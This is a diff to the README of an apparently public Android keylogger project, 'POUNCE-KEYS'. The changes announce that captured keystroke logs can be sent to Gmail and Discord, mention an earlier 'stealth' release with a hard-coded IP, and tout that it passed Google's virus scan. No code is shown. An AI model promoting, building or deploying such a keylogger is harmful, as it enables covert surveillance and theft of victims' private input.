@@ -15,7 +15,7 @@
   <h3 align="center">POUNCE-KEYS</h3>
 
   <p align="center">
-    Custom Java listener [ Keylogger for Android ] 🐱‍⌨️ + Discord listener
+    Gmail listener [ Keylogger for Android ] 🐱‍⌨️ + Discord listener
     <br />
     <a href="https://github.com/NullPounce/pounce-keys/releases">View Release</a>
     ·
@@ -25,7 +25,7 @@
   </p>
 </div>
 
-<a href='https://ko-fi.com/X8X6I1K9I' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi1.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a> DISCORD SUPPORT COMING SOON! come see a preview on my kofi!
+<a href='https://ko-fi.com/X8X6I1K9I' target='_blank'><img height='36' style='border:0px;height:36px;' src='https://storage.ko-fi.com/cdn/kofi1.png?v=3' border='0' alt='Buy Me a Coffee at ko-fi.com' /></a> Big Update!
 
 
  
@@ -35,8 +35,9 @@ my site (very wip, keeps breaking)
   </a>
 
 
-#  Release 2.1 stealth / iphardcode. thank you for my first <a href="https://github.com/users/NullPounce/achievements/starstruck">badge</a>
-I worked very hard on this version to hard code the ip instead. check the release section and enjoy!
+#  HUGE UPDATE! Supports sending logs to Gmail and Discord (Visit my Kofi for gmail and discord images of them in action
+notes in release section
+
 
 ✅ PASSED GOOGLE VIRUS SCAN
 
